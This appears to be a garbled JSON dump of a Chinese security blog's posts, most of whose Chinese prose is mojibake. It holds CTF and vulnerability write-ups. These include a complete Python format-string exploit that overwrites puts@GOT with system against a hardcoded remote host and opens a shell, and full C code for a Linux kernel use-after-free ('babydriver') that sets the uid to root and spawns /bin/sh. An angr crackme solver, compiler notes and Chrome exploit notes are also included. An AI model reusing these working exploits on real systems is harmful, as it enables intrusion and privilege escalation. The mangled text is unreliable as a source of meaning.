å°±å¯ä»¥æ‹¿åˆ°shellå•¦ã€‚è¿™æ˜¯æˆ‘æ‰¾libcçš„æ—¶å€™æˆªå›¾ 0x03:exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from zio import *#target = './pwn3'target = ('120.27.155.82',9000)r_m = COLORED(RAW, \"green\")w_m = COLORED(RAW, \"red\")pwd = \"rxraclhm\"def put_file(name,content):4io.read_until('ftp&gt;')4io.writeline(\"put\")4io.read_until(\"upload:\")4io.writeline(name)4io.read_until(\"content:\")4io.writeline(content)def get_file(name):4io.read_until('ftp&gt;')4io.writeline(\"get\")4io.read_until('get:')4io.writeline(name)def get_file2(name):4io.writeline(\"get\")4io.read_until('get:')4io.writeline(name)def put_file2(name,content):4io.writeline(\"put\")4io.read_until(\"upload:\")4io.writeline(name)4io.read_until(\"content:\")4io.writeline(content)pl1 = l32(0x0804A014) #printf@gotpl1 += \",%7$s,\"pl2 = l32(0x0804A024) #malloc@gotpl2 += \",%7$s,\"pl3 = l32(0x0804A028) #puts@gotpl3 += \",%7$s,\"offset_puts_to_system = 0x00065650 - 0x00040190#offset_puts_to_system = 0x269a0 # local io = zio(target,print_read=r_m,print_write=w_m,timeout=999)io.read_until('):')io.writeline(pwd)put_file(\"a\",pl3)#raw_input('$$$$')get_file(\"a\")rec = io.read_until('&gt;').strip()junk1,addr,junk2 = rec.split(',')print \"[*]puts is at:%s\" % (addr[0:4][::-1] or '').encode('hex')addr = addr[0:4][::-1].encode('hex')system_addr = hex(int(addr,16) - offset_puts_to_system)puts_addr = hex(int(addr,16))print \"[*]system is at:\" + system_addrx = int(addr,16) - offset_puts_to_system #a,b,c,d = [(x &gt;&gt; i) &amp; 0b11111111 for i in range(0, 25, 16)]a,b = [(x &gt;&gt; i) &amp; 0b1111111111111111 for i in range(0, 25, 16)]print hex(a)+\",\"+hex(b)put_file2(\"c\",l32(0x0804A028)+\"%%%dc\"%(a-4)+\"%7$hn\")raw_input('$$$')get_file(\"c\")put_file2(\"d\",l32(0x0804A028+2)+\"%%%dc\"%(b-4)+\"%7$hn\")get_file(\"d\")put_file2(\"/bin/sh;\",\"test\")io.writeline('dir')io.interact() get shell","link":"/2016/04/30/cctf-pwn350/"},{"title":"codegate2017-angrybird","text":"0x00:æœ€è¿‘åˆåœ¨çœ‹angräº†ï¼Œæ€»ç»“äº†ä¸€ä¸‹å¸¸è§çš„ç”¨æ³•ä»¥åŠä¸€äº›æ¨¡æ¿â€¦æ­£å¥½è¿™ä¸ªé¢˜ç›®å¯ä»¥ç”¨ä¸Šã€‚ 0x01ï¼šé¢˜ç›®åˆ†æx64çš„elfæ–‡ä»¶ï¼Œè¿è¡Œä¸€ä¸‹ç›´æ¥é€€å‡ºäº†ï¼š 1234# muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:12]$ ./angrybird# muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:15] C:1$ ç›´æ¥ä¸¢è¿›IDAçœ‹æ±‡ç¼– 123456789101112131415161718192021222324252627282930313233343536.text:0000000000400761 push rbp.text:0000000000400762 mov rbp, rsp.text:0000000000400765 add rsp, 0FFFFFFFFFFFFFF80h.text:0000000000400769 mov rax, fs:28h.text:0000000000400772 mov [rbp+var_8], rax.text:0000000000400776 xor eax, eax.text:0000000000400778 cmp eax, 0.text:000000000040077B jz _exit.text:0000000000400781 mov [rbp+var_70], offset off_606018.text:0000000000400789 mov [rbp+var_68], offset off_606020.text:0000000000400791 mov [rbp+var_60], offset off_606028.text:0000000000400799 mov [rbp+var_58], offset off_606038.text:00000000004007A1 mov eax, 0.text:00000000004007A6 call sub_4006F6.text:00000000004007AB mov [rbp+n], eax.text:00000000004007AE mov eax, 0.text:00000000004007B3 call sub_40070C.text:00000000004007B8 mov eax, 0.text:00000000004007BD call sub_40072A.text:00000000004007C2 mov rdx, cs:stdin ; stream.text:00000000004007C9 mov ecx, [rbp+n].text:00000000004007CC lea rax, [rbp+s].text:00000000004007D0 mov esi, ecx ; n.text:00000000004007D2 mov rdi, rax ; s.text:00000000004007D5 call _fgets.text:00000000004007DA movzx edx, [rbp+s].text:00000000004007DE movzx eax, [rbp+var_4F].text:00000000004007E2 xor eax, edx.text:00000000004007E4 mov [rbp+var_30], al.text:00000000004007E7 movzx eax, [rbp+var_30].text:00000000004007EB cmp al, 0Fh.text:00000000004007ED jg short loc_400803.text:00000000004007EF mov edi, offset aMelong ; &quot;melong&quot;.text:00000000004007F4 call _puts.text:00000000004007F9 mov edi, 1 ; status.text:00000000004007FE call _exit è¿™ä¸ªcméå¸¸è§„ï¼Œå‰é¢å¾ˆå¤šä¹±ä¸ƒå…«ç³Ÿçš„å‡½æ•°ï¼Œå°±æ˜¯è®©ä½ æ‰§è¡Œä¸åˆ°æ­£å¸¸é€»è¾‘å»ã€‚å¦‚æœæƒ³è¦æ‰§è¡Œåˆ°00000000004007C2å»ï¼Œç„¶åå»é€†å‘ç®—æ³•ä»€ä¹ˆï¼Œéœ€è¦æŠŠå‰é¢çš„ä¸€äº›æ‹¦è·¯è™å…¨éƒ¨patchæ‰â€¦æˆ‘å¼€å§‹åœ¨åšpatchä¸€ç‚¹ï¼Œè°ƒè¯•ä¸€ç‚¹ï¼Œç„¶åç»§ç»­patchâ€¦åæ¥å®åœ¨å¿ä¸äº†ï¼Œå¤ªå‘äº†ï¼Œç›´æ¥ä¸Šç¬¦å·æ‰§è¡Œç®—äº†ã€‚ 0x02ï¼šè§£å†³æ¨¡æ¿ä½¿ç”¨angrç¬¦å·æ‰§è¡Œè§£é¢˜å¯ä»¥ä¸ä»mainå¼€å§‹è·‘ï¼Œåªè¦æŒ‡å®šä¸€ä¸ªå…¥å£å°±å¥½äº† 12345678910import angrprog = angr.Project('./cm')#s = prog.factory.blank_state(addr=0x0804864B)s = prog.factory.entry_state(args=[\"./cm\"])pg = prog.factory.path_group(s, immutable=False)path = pg.explore(find=(0x0804864B,))print pathprint pg.found[0].state.se._solver.result.model ä¸è¿‡åé¢printçš„éƒ¨åˆ†éœ€è¦åšä¸€ç‚¹æ”¹åŠ¨â€¦å› ä¸ºæœ‰äº›é¢˜ç›®è¾“å…¥æ˜¯ä»å‘½ä»¤è¡Œå‚æ•°ç»™çš„ï¼Œæœ‰äº›æ˜¯readé‚£ç§è¯»å–çš„ã€‚ 1234567.text:0000000000404FAB loc_404FAB: ; CODE XREF: main+4834\u0018j.text:0000000000404FAB lea rax, [rbp+s].text:0000000000404FAF mov rsi, rax.text:0000000000404FB2 mov edi, offset format ; &quot;you typed : %s\\n&quot;.text:0000000000404FB7 mov eax, 0.text:0000000000404FBC call _printf.text:0000000000404FC1 mov eax, 0 æ‰§è¡Œåˆ°è¿™é‡Œ0000000000404FC1å°±å¯ä»¥ï¼Œä¸è¿‡è¦ä½¿ç”¨posixç›¸å…³çš„æ–¹æ³•å»æå–è¾“å…¥ã€‚ solve.py12345678910111213141516171819202122#!/usr/bin/env python# coding=utf-8import angrstart_addr = 0x00000000004007C2def main(): prog = angr.Project('angrybird', load_options={\"auto_load_libs\": False}) #s = prog.factory.entry_state(addr=start_addr) s = prog.factory.blank_state(addr=start_addr) path = prog.factory.path(s) pg = prog.factory.path_group(path, immutable=False) find = pg.explore(find=(0x0000000000404FC1)) print find print pg.found[-1].state.posix.dumps(0)if __name__ == '__main__': main() ç»“æœ 1234(angr) âœ Desktop python solve.py WARNING | 2017-03-04 05:33:08,495 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.&lt;PathGroup with 418 deadended, 4 active, 1 found&gt;Im_so_cute&amp;pretty_:)\u0004ï¿½\u0002 @\u0002 \u0001ï¿½ \u0010 J\u0004 \u0002\u0010\u0002 \u0010 \u0001ï¿½\u0001\u0010\u0010\u0002\u0004 0x03ï¼šå‚è€ƒä¸å¼•ç”¨Yscâ€˜s blog","link":"/2017/03/04/codegate2017-angrybird/"},{"title":"compilerå­¦ä¹ ","text":"0x00:å‰è¨€ä¸€ç›´æƒ³åšçš„fuzzeræ¶‰åŠåˆ°å¾ˆå¤šè¯­æ³•ç›¸å…³çš„ä¸œè¥¿ï¼Œç¼–è¯‘åŸç†ç›¸å…³çš„è¡¥è¯¾è¿«åœ¨çœ‰ç«-ã€‚- ä¸è¿‡ä¹Ÿåªèƒ½æ…¢æ…¢çš„æ¥å­¦ä¹ ã€‚è¿™ç¯‡æ–‡ç« å‡†å¤‡æ…¢æ…¢æ›´æ–°ï¼Œæ¶‰åŠæˆ‘çš„å­¦ä¹ è¿‡ç¨‹å’Œå¯¹ä»¥å‰çš„å¤§ä½¬çš„ä¸€ä¸ªtoy compilerçš„å­¦ä¹ ï¼Œç†è®º+å®è·µæ‰æ˜¯ç‹é“ã€‚ 0x01:å…³äºå­¦ä¹ 1. å…¬å¼€è¯¾1.1 å“ˆå·¥å¤§çš„ç¼–è¯‘åŸç†é™ˆè€å¸ˆè®²çš„è¶…çº§å¥½ï½æ…¢æ…¢çœ‹ï¼Œçœ‹äº†ä¸‹ï¼Œè¿™ä¸ªæ˜¯åŸºäºé¾™ä¹¦è®²çš„ï¼Œå½“ç„¶æ²¡æœ‰å±•å¼€å¾ˆå¤šï¼Œè¿˜æ˜¯éœ€è¦å¤šä¸‹åŠŸå¤«å»çœ‹çœ‹ï¼› 1.2 ä¸­ç§‘å¤§ç¼–è¯‘åŸç†è¯¾ç¨‹è¿™ä¸ªä¹Ÿè¡Œï¼Œé€šä¿—æ˜“æ‡‚ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰æ²¡æœ‰å“ˆå·¥å¤§é‚£ä¸ªè¯¾ç¨‹å…¨é¢ã€‚ ç»¼åˆä¸ªäººæ„Ÿè§‰ï¼Œæ¦‚å¿µå¤ªå¤šï¼Œæ¶‰åŠçš„çŸ¥è¯†æ‚è€Œå¹¿ï¼Œæ‰€ä»¥æœ‰ä¸ªå¤§æ¦‚å°è±¡ï¼Œéœ€è¦ä»€ä¹ˆçš„æ—¶å€™å†æ·±å…¥çœ‹ä¼šæ¯”è¾ƒå¥½ä¸€ç‚¹ã€‚ 2. ä¹¦2.1 é¾™ä¹¦æˆ‘æ˜¯çœ‹ä¸ä¸‹å»...å¥½æ¯ç‡¥ï¼Œä¹Ÿå°±ä¸‹äº†ä¸ªpdfï¼Œçœ‹å…¬å¼€è¯¾çš„æ—¶å€™ç”¨æ¥å½“å‚è€ƒï¼Œä¸€äº›æ¦‚å¿µè®°ä¸æ¸…äº†å°±å»ç¿»ä¸€ç¿»å•¥çš„ã€‚ 2.2 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹è¿™æœ¬ä¸é”™ï¼Œå®è·µçš„ä¸€æœ¬ä¹¦ï¼Œä¸è¿‡ï¼Œæ²¡æœ‰çœ‹è¿‡ä¸€äº›åŸºç¡€å†…å®¹çš„å°±åˆ«çœ‹äº†ï¼Œè¿™æœ¬ä¹¦æ²¡ä»€ä¹ˆå¤ªå¤šçš„åŸºç¡€å†…å®¹ä»‹ç»ï¼Œå°±æ˜¯ä¸Šæ¥å°±ä»è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€ä»£ç ç”Ÿæˆä¸€ç‚¹ä¸€ç‚¹åœ°æ‹¿ä»£ç ç»™ä½ è®²ï¼›æ˜¯ç”¨javaå®ç°çš„ä¸€ä¸ªç±»cè¯­è¨€çš„ä¸€ä¸ªç¼–è¯‘å™¨ã€‚æ‰€ä»¥è¿™æœ¬æˆ‘æ˜¯æ”¾åœ¨åé¢ä¸€ç‚¹çš„ä½ç½®å†å»çœ‹çš„ï¼ŒåŸºæœ¬çœ‹å®Œï¼Œä½†æ˜¯éœ€è¦ç»“åˆå»çœ‹ä»–çš„ä»£ç ï¼Œè¿˜éœ€è¦ä»”ç»†è¿‡ä¸€è¿‡ã€‚ 2.3 flexä¸bisonè¿™ä¸ªä¸é”™ä¸¤ç™¾å¤šé¡µçš„å°è–„æœ¬ï¼Œä½†æ˜¯å†…å®¹å¾ˆå¤šï¼Œä»£ç è¦å¥½å¥½æ¶ˆåŒ–ï¼Œè¿˜æ˜¯é‚£å¥è¯ï¼Œæ²¡æœ‰åŸºç¡€çŸ¥è¯†(from é¾™ä¹¦orå…¬å¼€è¯¾)ï¼Œå°±ç®—äº†ï¼Œè¦ä¸ç„¶çœ‹åˆ°ä½œè€…å†™çš„é‚£äº›ä»£ç ç†è§£èµ·æ¥å¾ˆè´¹åŠ²ã€‚è¿™æœ¬åªçœ‹äº†éƒ¨åˆ†ï¼Œåªåˆ°sqlé‚£ä¸ªåˆ†æã€‚ 2.4 ç°ä»£ç¼–è¯‘å™¨(è™ä¹¦)åå®è·µçš„ä¸€æœ¬ï¼Œä½†æ˜¯æˆ‘æ²¡çœ‹ 233333 2.5 Antlr4 æƒå¨æŒ‡å—æœ‰ä¸€å®šåŸºç¡€ï¼Œæ¨èçœ‹ã€‚ç»“åˆantlr4å¯ä»¥å¾ˆå¿«ä¸Šæ‰‹ï½ è€Œä¸”è¿™ä¸ªä¸œè¥¿åº”ç”¨ååˆ†å¹¿æ³› -ã€‚- æ¯”å¦‚åœ¨bug huntingçš„éƒ¨åˆ†ï½ 3. å®è·µé¡¹ç›®3.1 ä¸€ä¸ªå¤–å›½äººå†™çš„toy compilerï¼Œbased on llvm3.2 ã€Šflexä¸bisonã€‹ä¸­çš„é‚£ä¸ªsqlçš„è§£ææŒºä¸é”™çš„3.3 ã€Šè‡ªåˆ¶ç¼–è¯‘å™¨ã€‹ä¸­çš„cbc3.4 llvm æ–‡æ¡£ä¸­çš„Kaleidoscope3.5 æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º C è¯­è¨€ç¼–è¯‘å™¨0x02 : toy compilerå­¦ä¹ 1. åŸºæœ¬æƒ…å†µè€å¤–å†™çš„ä¸€ä¸ªç®€æ˜“çš„compilerï¼Œä½¿ç”¨flex+bisonåšå‰ç«¯ï¼Œllvmåç«¯ä»£ç ç”Ÿæˆçš„ä¸€ä¸ªdemoã€‚ writing-your-own-toy-compiler ä»£ç åœ¨GitHubä¸Šå¯ä»¥æ‰¾åˆ° 2. é¡¹ç›®ç»“æ„ç¨å¾®å¤æ‚ä¸€äº›ã€å¤§ä¸€äº›çš„é¡¹ç›®ï¼Œé˜…è¯»ä¹‹å‰æœ€å¥½ææ˜ç™½é¡¹ç›®çš„ç»“æ„ï¼Œè¿™ä¸ªtoy compilerè™½ç„¶ä»£ç é‡ä¸å¤§ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ææ˜ç™½ç»“æ„ï¼Œæ–¹ä¾¿åé¢çš„é˜…è¯»ã€‚ ç¼–è¯‘çš„æµç¨‹æ˜¯è¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€ä»£ç ç”Ÿæˆã€‚ æ ¹æ®è¿™ä¸ªè¿‡ç¨‹å»åˆ†(æœ‰äº›å¤´æ–‡ä»¶åœ¨ä¸åŒçš„è¿‡ç¨‹ä¸­éƒ½ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚node.h)ï¼š è¯æ³•åˆ†æ tokens.l ã€parser.hppã€node.h è¯­æ³•åˆ†æ parser.yã€node.h ä»£ç ç”Ÿæˆ codegen.cppã€codegen.hã€corefn.cpp å…¶ä»– main.cpp toy compilerçš„ä¸»ä½“ example.txt æµ‹è¯•ç”¨ä¾‹ 3. ä»£ç é˜…è¯»å­¦ä¹ 3.1 ä¸»ä½“éƒ¨åˆ† main.cpp123456789101112yyparse();cout &lt;&lt; programBlock &lt;&lt; endl;// see http://comments.gmane.org/gmane.comp.compilers.llvm.devel/33877InitializeNativeTarget();InitializeNativeTargetAsmPrinter();InitializeNativeTargetAsmParser();CodeGenContext context;createCoreFunctions(context);context.generateCode(*programBlock);context.runCode(); è°ƒç”¨yyparseè§£æè¾“å…¥ï¼Œç„¶åè¾“å‡ºprogranblockä¹‹åï¼Œä½¿ç”¨llvmåšä»£ç ç”Ÿæˆã€‚ 3.2 è¯æ³•åˆ†æè¯æ³•åˆ†ææ˜¯ä½¿ç”¨flexåšçš„ï¼Œè¯æ³•åˆ†ææ˜¯æŠŠè¾“å…¥åˆ†å‰²æˆtokenåºåˆ—ï¼Œåœ¨tokens.lä¸­ï¼Œå®šä¹‰äº†å„ç§tokenã€‚ 123456789101112131415161718192021222324252627[ \\t\\n] ;&quot;extern&quot; return TOKEN(TEXTERN);&quot;return&quot; return TOKEN(TRETURN);[a-zA-Z_][a-zA-Z0-9_]* SAVE_TOKEN; return TIDENTIFIER;[0-9]+\\.[0-9]* SAVE_TOKEN; return TDOUBLE;[0-9]+ SAVE_TOKEN; return TINTEGER;&quot;=&quot; return TOKEN(TEQUAL);&quot;==&quot; return TOKEN(TCEQ);&quot;!=&quot; return TOKEN(TCNE);&quot;&lt;&quot; return TOKEN(TCLT);&quot;&lt;=&quot; return TOKEN(TCLE);&quot;&gt;&quot; return TOKEN(TCGT);&quot;&gt;=&quot; return TOKEN(TCGE);&quot;(&quot; return TOKEN(TLPAREN);&quot;)&quot; return TOKEN(TRPAREN);&quot;{&quot; return TOKEN(TLBRACE);&quot;}&quot; return TOKEN(TRBRACE);&quot;.&quot; return TOKEN(TDOT);&quot;,&quot; return TOKEN(TCOMMA);&quot;+&quot; return TOKEN(TPLUS);&quot;-&quot; return TOKEN(TMINUS);&quot;*&quot; return TOKEN(TMUL);&quot;/&quot; return TOKEN(TDIV); åŒ¹é…çš„è¯å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„é‚£ç§åŒ¹é…åŸåˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æºç é‡Œé‡åˆ°äº†å¯¹åº”çš„tokenï¼Œå°±è¿”å›{å­—é¢å€¼ï¼ŒTOKENå}è¿™æ ·çš„åºåˆ—ã€‚ä¸åŒçš„tokenç±»å‹ï¼Œåœ¨parser.hppä¸­å®šä¹‰(å®å®šä¹‰)ã€‚ 3.2 è¯­æ³•åˆ†æè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨äº†bisonï¼Œä»tokenåºåˆ—ä¾ç…§æå‰å®šä¹‰å¥½çš„è¯­æ³•è§„åˆ™ï¼Œç”Ÿæˆå¯¹åº”çš„astã€‚ è§„åˆ™åœ¨parser.yé‡Œ 123456789101112131415161718192021222324252627program : stmts { programBlock = $1; } ; stmts : stmt { $$ = new NBlock(); $$-&gt;statements.push_back($&lt;stmt&gt;1); } | stmts stmt { $1-&gt;statements.push_back($&lt;stmt&gt;2); } ;stmt : var_decl | func_decl | extern_decl | expr { $$ = new NExpressionStatement(*$1); } | TRETURN expr { $$ = new NReturnStatement(*$2); } ;block : TLBRACE stmts TRBRACE { $$ = $2; } | TLBRACE TRBRACE { $$ = new NBlock(); } ;var_decl : ident ident { $$ = new NVariableDeclaration(*$1, *$2); } | ident ident TEQUAL expr { $$ = new NVariableDeclaration(*$1, *$2, $4); } ;extern_decl : TEXTERN ident ident TLPAREN func_decl_args TRPAREN { $$ = new NExternDeclaration(*$2, *$3, *$5); delete $5; } ;func_decl : ident ident TLPAREN func_decl_args TRPAREN block { $$ = new NFunctionDeclaration(*$1, *$2, *$4, *$6); delete $4; } ; å¯¹è¡¨è¾¾å¼ã€ä»£ç å—ã€å˜é‡å®šä¹‰ï¼Œéƒ½æœ‰å¯¹åº”çš„è¯­æ³•è§„åˆ™ã€‚ ä½œè€…è®¾è®¡çš„aståœ¨node.hä¸­ï¼Œå¯¹äºä¸åŒçš„è¯­å¥ï¼Œå¯¹åº”çš„astä¹Ÿä¸åŒï¼Œè¿™é‡Œä¸¾ä¾‹äº†è¡¨è¾¾å¼å£°æ˜å’Œå˜é‡å£°æ˜çš„astè®¾è®¡ï¼š 1234567891011121314151617181920212223242526272829303132333435//è¡¨è¾¾å¼å£°æ˜class NExpressionStatement : public NStatement {public: NExpression&amp; expression; NExpressionStatement(NExpression&amp; expression) : expression(expression) { } virtual llvm::Value* codeGen(CodeGenContext&amp; context);};//å˜é‡å£°æ˜ï¼Œä¸¤ä¸ªæ„é€ æ–¹æ³•ã€‚//ç±»å‹ å˜é‡å//ç±»å‹ å˜é‡å = åˆå§‹å€¼class NVariableDeclaration : public NStatement {public: const NIdentifier&amp; type; NIdentifier&amp; id; NExpression *assignmentExpr; NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id) : type(type), id(id) { assignmentExpr = NULL; } NVariableDeclaration(const NIdentifier&amp; type, NIdentifier&amp; id, NExpression *assignmentExpr) : type(type), id(id), assignmentExpr(assignmentExpr) { } virtual llvm::Value* codeGen(CodeGenContext&amp; context);};class NExternDeclaration : public NStatement {public: const NIdentifier&amp; type; const NIdentifier&amp; id; VariableList arguments; NExternDeclaration(const NIdentifier&amp; type, const NIdentifier&amp; id, const VariableList&amp; arguments) : type(type), id(id), arguments(arguments) {} virtual llvm::Value* codeGen(CodeGenContext&amp; context);}; 3.3 ä»£ç ç”Ÿæˆ(è¿˜åœ¨çœ‹)è¿™éƒ¨åˆ†å¦‚æœçº¯è‡ªå·±åšçš„è¯ï¼Œæ€•æ˜¯è¦å†™å¥½ä¹…äº†ï¼Œå¦‚æœä½¿ç”¨llvmçš„è¯ï¼Œå°±å¿«å¾ˆå¤šã€‚ è¿™éƒ¨åˆ†çš„ä»£ç è¿˜åœ¨çœ‹ï¼Œè¦ç»“åˆllvmçš„æ–‡æ¡£æ¥çœ‹","link":"/2018/01/20/compiler%E5%AD%A6%E4%B9%A0/"},{"title":"babydriver writeup","text":"0x00:ä¹‹å‰å›½èµ›çš„ä¸€ä¸ªLinux kernel pwnï¼ŒAtumå¤§ä½¬çš„é¢˜ç›®ã€‚ ç®€å•çš„æ¥è¯´å°±æ˜¯kernelçš„UAFï¼Œæ€ä¹ˆåˆ©ç”¨å°±ä»è€…è§ä»ï¼Œæ™ºè€…è§æ™ºäº†ã€‚ å¤æ‚ä¸€ç‚¹ï¼Œ0ctf knoteçš„æ€è·¯ï¼Œå–·å°„tty_structå†…æ ¸å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨writeæ–¹æ³•ä¿®æ”¹è¿™ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå®Œæˆææƒï¼Œä½†æ˜¯è¦bypass smtpä¿æŠ¤ï¼Œè¿™ä¸ªéœ€è¦ROPã€‚ èµ›åé—®äº†å‡ºé¢˜äººï¼Œæœ€ç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥forkï¼Œåˆ©ç”¨writeæ–¹æ³•æ”¹uidå»æ‹¿rootï¼Œä»£ç ä¹Ÿå¾ˆçŸ­ï¼Œä¸éœ€è¦bypass é‚£äº›ä¿æŠ¤ã€‚ æ–¹æ³•1çš„è¯fpçš„wpå†™çš„å¾ˆæ¸…æ¥š(è†œçŸ³æ€»+æ—åšå£«),æ–¹æ³•2çš„è¯æ–‡ç« åé¢ä¼šæ”¾å‡ºå‡ºé¢˜äººçš„expã€‚ 0x01: å‡ºé¢˜äººçš„exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;pthread.h&gt;const long long credsize=168;char *dev=&quot;/dev/babydev&quot;;char buf[100];volatile int racestop=0;volatile int releasedone=0;int main(){ int fd1,fd2,ret; char zero[100]={0}; fd1=open(dev,O_RDWR); fd2=open(dev,O_RDWR); printf(&quot;fd1=%d\\n fd2=%d\\n&quot;,fd1,fd2); ret=ioctl(fd1,0x10001,credsize); printf(&quot;ioctl in main =%d\\n&quot;,ret); close(fd1); int t=1000; int pid=fork(); if(pid&lt;0){ puts(&quot;error,pid&lt;0&quot;); return 0; } if(pid==0){ ret=write(fd2,zero,28); printf(&quot;write in writebuf=%d\\n&quot;,ret); t=getuid(); printf(&quot;uid=%d\\n&quot;,t); if(t==0){ system(&quot;/bin/sh&quot;); exit(0); } else{ exit(0); } } else{ wait(NULL); } close(fd2); return 0;}","link":"/2017/07/13/babydriver-writeup/"},{"title":"crbug1051017 exploit","text":"aboutæœ€è¿‘çœ‹åˆ°crbug 1051017å…¬å¼€äº†pocï¼Œè¿™æ˜¯ä¸€ä¸ªå“ç›¸å¾ˆå¥½çš„ç±»å‹æ··æ·†ï¼Œå…·ä½“å¯ä»¥çœ‹åŸä½œè€…çš„æ¼æ´æŠ¥å‘Šï¼Œå†™å¾—ååˆ†è¯¦ç»†ã€‚ how2exploitå› ä¸ºglazunovçš„pocå·²ç»åšåˆ°äº†oob arrayé˜¶æ®µäº†ï¼Œæ‰€ä»¥é€šè¿‡å¸ƒå±€ä¸€ä¸ªBigUint64Arrayæ¥ä»»æ„åœ°å€è¯»å†™å³å¯ï¼Œå³åˆ©ç”¨æ–¹å¼å‚è€ƒCVE-2020-6418å°±å¯ä»¥äº†ã€‚ full exploitexploit referencecrbug 1051017browser-pwn-cve-2020-6418æ¼æ´åˆ†æ","link":"/2020/06/05/crbug1051017-exploit/"},{"title":"exploit for crbug1086890","text":"bug infoæ¥è‡ªpj0çš„glazunovçš„æ´ï¼Œä¸€ä¸ªJITä¼˜åŒ–ä¸­çš„æ´ï¼Œç¼ºå°‘è¾¹ç•Œæ£€æŸ¥æœ€ç»ˆå¯¼è‡´oob r/wã€‚ exploitæ¯”è¾ƒä¸å¥½çš„åœ°æ–¹å°±æ˜¯éœ€è¦å¤§æ¦‚çŒœä¸€ä¸‹é‚£ä¸ªoobarrayçš„elementsçš„åœ°å€ï¼Œä½¿å¾—æˆ‘ä»¬æƒ³ç”¨æ¥aar/wçš„arrayæˆ–è€…arraybufferè½åœ¨è¿™åé¢ï¼Œå¤§æ¦‚è°ƒæ•´ä¸ªåç§»ä½¿å¾—èƒ½å¤Ÿæ­£å¸¸è¯»å†™åˆ°å°±è¡Œã€‚ æµ‹è¯•ç‰ˆæœ¬:83.0.4103.61 1234567Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048beBranch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514Branch Base Position: 756066V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480afV8 Version: 8.3.110.9V8 Position: 19Skia Commit: c3d05a789930913af94174961bc6f90894196f62 è°ƒè¯•ä¼šæ¯”è¾ƒéº»çƒ¦ç‚¹ï¼Œgdb ç›´æ¥èµ·è§¦å‘æœ‰é—®é¢˜ï¼ˆæˆ‘è¿™é‡Œæ˜¯ï¼‰ï¼Œæˆ‘æ˜¯å¼€äº†coredumpï¼Œç„¶åè§¦å‘crashçœ‹çœ‹å†…å­˜å•¥çš„è°ƒçš„ã€‚ biguint64 è¿˜æ˜¯ arraybufferéƒ½è¡Œï¼Œå–œæ¬¢å•¥ç”¨å•¥ã€‚ æƒ³æˆåŠŸç‡é«˜ï¼Œè¦ç”¨web workerï¼ˆæˆ‘è§‰å¾—ï¼‰ï¼Œè¦ä¹ˆæ­»çŒœå‡ ä¸ªåœ°å€ï¼Œè¦ä¹ˆéšæœºæ’å¤§è¿ã€‚ å®Œæ•´åˆ©ç”¨ä»£ç  è§‰å¾—æœ‰ç”¨çš„æœ‹å‹å¯ä»¥æ‰“èµä¸€æ¯â˜•ï¸ :)","link":"/2020/08/27/exploit-for-crbug1086890/"},{"title":"find macOS service and it&#39;s plist file","text":"0x00:find macOS service â€˜s plist file. com.apple.xxxx â€”&gt; xxxx.plist 0x01 :find all *.plist file and use grep to find target service, not the best way. 0x02 :use procexp. 1./procexp.universal all ports | service_name 0x03 :this way is more complex than others, thx to brightiup :) step 1 write a simple gadget, core logic as follow: 12345bootstrap_look_up(bs_port, render_service_name, &amp;p);...mach_msg(&amp;m.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(message), 0, 0, 0, 0);...getchar(); //do not exit untill we finish step 2 get the pid of your gadget Step 3 1sudo lsmp -p pid now, you can get the service name according to mach port, then find the plist file by service name you found.","link":"/2019/06/14/find-macOS-service-and-it-s-plist-file/"},{"title":"format string with stack frame","text":"0x00:å†™åœ¨å‰é¢æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å‡ºç°çš„æ—¶é—´å¾ˆæ—©äº†ï¼Œå¶ç„¶åœ¨å‰ä¸€æ®µæ—¶é—´å­¦åˆ°äº†ä¸€ä¸ªå…¶ä»–çš„åˆ©ç”¨å§¿åŠ¿ï¼Œé€šè¿‡æ ˆæ¡¢ç»“æ„å»åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚åŸæ–‡é“¾æ¥ 0x01:åŸç†åœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå¼€è¾Ÿä¸€æ®µç©ºé—´å»ç»™å½“å‰å‡½æ•°ä½¿ç”¨ï¼Œåšæ³•æ˜¯é€šè¿‡æŠ¬é«˜æ ˆæ¥å®ç°(sub esp,0x**)ï¼Œä¸ºäº†æ‰§è¡Œå‡½æ•°åèƒ½æ­£ç¡®çš„è¿”å›ï¼Œæ ˆåŸºæŒ‡é’ˆebpæ˜¯æŒ‡å‘ä¸Šä¸€ä¸ªå‡½æ•°çš„ebpçš„ï¼Œä¹Ÿå°±æ˜¯è¢«è°ƒç”¨å‡½æ•°ebpæŒ‡å‘è°ƒç”¨å‡½æ•°ebpã€‚ å¤§æ¦‚çš„æ ·å­å°±å¦‚å›¾äº†ï¼Œç®€å•çš„å†™ä¸€ä¸ªdemoå°±å¯ä»¥å‘ç°è¿™ä¸ªã€‚ å¯¹äºæ 